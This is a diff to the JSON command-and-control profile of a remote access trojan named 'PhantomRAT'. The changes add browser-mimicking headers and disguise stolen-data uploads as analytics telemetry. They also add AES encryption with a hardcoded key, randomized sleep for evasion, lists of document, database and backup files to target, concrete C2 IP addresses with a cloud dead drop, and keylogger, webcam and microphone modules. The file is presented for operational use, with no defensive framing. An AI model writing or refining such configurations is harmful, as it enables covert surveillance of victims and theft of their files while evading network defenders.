@@ -1,42 +1,101 @@
 {
+  "name": "PhantomRAT_Stealth_Profile",
+  "version": "2.0",
   "http-get": {
     "client": {
       "header": {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate",
+        "Connection": "keep-alive",
+        "Cache-Control": "no-cache",
+        "Pragma": "no-cache"
       },
       "uri": "/api/v1/update",
-      "verb": "GET"
+      "verb": "GET",
+      "parameters": {
+        "client_id": "{{RANDOM_8}}",
+        "session": "{{RANDOM_16}}",
+        "timestamp": "{{TIMESTAMP}}"
+      }
     },
     "server": {
       "header": {
-        "Content-Type": "application/json"
+        "Content-Type": "application/json; charset=utf-8",
+        "Server": "nginx/1.18.0",
+        "X-Content-Type-Options": "nosniff",
+        "X-Frame-Options": "DENY"
       },
       "output": {
-        "base64": true
+        "base64": true,
+        "gzip": true,
+        "encrypt": true
       }
     }
   },
   "http-post": {
     "client": {
       "header": {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Content-Type": "application/json"
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Content-Type": "application/json; charset=utf-8",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate",
+        "Connection": "keep-alive",
+        "Cache-Control": "no-cache",
+        "X-Requested-With": "XMLHttpRequest"
       },
       "uri": "/api/v1/data",
-      "verb": "POST"
+      "verb": "POST",
+      "parameters": {
+        "source": "analytics",
+        "type": "telemetry",
+        "version": "1.0"
+      }
     },
     "server": {
       "header": {
-        "Content-Type": "application/json"
+        "Content-Type": "application/json; charset=utf-8",
+        "Server": "nginx/1.18.0",
+        "X-Content-Type-Options": "nosniff"
       },
       "output": {
-        "base64": false
+        "base64": false,
+        "gzip": false,
+        "encrypt": false
       }
     }
   },
-  "sleep": 30,
-  "jitter": 10,
+  "sleep": {
+    "min": 45,
+    "max": 120,
+    "jitter": 15
+  },
   "encryption": {
-    "key": "shared_secret_key_32_chars_long"
+    "algorithm": "AES-256-GCM",
+    "key": "shared_secret_key_32_chars_long_phantom",
+    "iv_length": 16
+  },
+  "obfuscation": {
+    "sleep_variance": true,
+    "fake_traffic": true,
+    "mimic_requests": true
+  },
+  "targets": {
+    "file_extensions": [".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".jpg", ".png", ".sql", ".db"],
+    "backup_paths": ["/var/backups", "/home/*/backup", "C:\\Backup"],
+    "network_ranges": ["141.105.71.0/24", "192.168.1.0/24"]
+  },
+  "c2": {
+    "primary": "http://141.105.71.196",
+    "secondary": ["http://141.105.71.2", "http://141.105.71.10"],
+    "cloud_fallback": true,
+    "dead_drop": "https://drive.google.com"
+  },
+  "modules": {
+    "auto_load": ["keylogger", "network", "fileops"],
+    "on_demand": ["screencap", "webcam", "mic"]
   }
 }
+
